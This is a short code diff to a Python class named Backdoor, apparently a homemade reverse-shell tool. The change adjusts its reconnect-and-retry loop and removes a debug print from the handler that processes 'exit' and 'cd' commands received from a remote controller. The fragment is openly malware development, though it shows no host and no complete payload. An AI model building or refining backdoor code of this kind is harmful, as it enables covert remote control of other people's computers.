@@ -30,7 +30,8 @@ class Backdoor:
 					self.connected = True
 					print("[+] Connected")
 				except:
-					time.sleep(3)
+					pass
+			time.sleep(3)
 
 
 	def reliable_send(self, data):
@@ -83,7 +84,6 @@ class Backdoor:
 				if command == "exit":
 					self.reliable_send("Exiting...")
 					self.connected = False
-					print(self.connected)
 
 				elif command.split()[0] == "cd":
 					path = command.replace("cd", "").strip()
